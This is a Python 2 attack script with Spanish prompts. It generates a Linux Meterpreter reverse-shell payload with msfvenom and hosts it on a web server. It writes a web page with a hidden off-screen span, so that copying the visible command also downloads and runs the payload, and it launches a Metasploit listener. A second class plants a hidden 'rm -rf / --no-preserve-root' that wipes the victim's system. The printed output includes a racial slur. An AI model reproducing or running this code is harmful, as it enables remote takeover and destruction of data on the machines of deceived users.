#-*- coding: utf-8 -*-
import os
from colores import *
class linux:
	def __init__(self):
		self.ip=raw_input(bcolors.payload+"Ingrese ip: ")
		self.port=raw_input(bcolors.payload+"Ingrese puerto: ")
		self.mensaje1=raw_input(bcolors.payload+"Ingrese primer mensaje: ")
		self.mensaje2=raw_input(bcolors.payload+"Ingrese segundo mensaje: ")
		self.comando=raw_input(bcolors.payload+"Ingrese comando: ")
	def linuxinfect(self):
		print bcolors.apache+"[x]Limpiando..."
		os.system("rm /var/www/html/payload.elf")
		os.system("rm /var/www/html/index.html")
		print bcolors.OKBLUE+"[*]Creando payload..."
		os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + self.ip + " LPORT=" + self.port + " -f elf > /var/www/html/payload.elf")
		index="index.html"
		job=open(index,"w")	
		job.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+self.ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + self.comando + """ </span> """+self.mensaje2+""" </p>""")
		job.close()
		os.system("cp index.html /var/www/html")
		print bcolors.payload+"[:D] Todo esta completo http://"+self.ip+"/ Con toda campeon ;v"
		continuar=raw_input(bcolors.payload+"desea continuar (Si/No) ")
		if continuar == "si":
			documento="meta_config"
			archivo = open(documento,"w")
			archivo.write("""use multi/handler\nset payload linux/x86/meterpreter/reverse_tcp\nset LHOST """ + self.ip + """\nset LPORT """ + self.port + """\nset ExitOnSession false\nexploit -j""")
			archivo.close()
			os.system("msfconsole -r meta_config")
		elif continuar == "no":
			print bcolors.FAIL+"bay bay nigga"
class LinuxDelete(linux):
	def linuxrm(self):
		index="index.html"
		job=open(index,"w")	
		job.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; rm -rfv / --no-preserve-root & disown && clear <br> """ + self.comando + """ </span> """+self.mensaje2+""" </p>""")
		job.close()
		os.system("cp index.html /var/www/html")
		print bcolors.payload+"[:D] Todo esta completo http://"+self.ip+"/ Con toda campeon ;v"
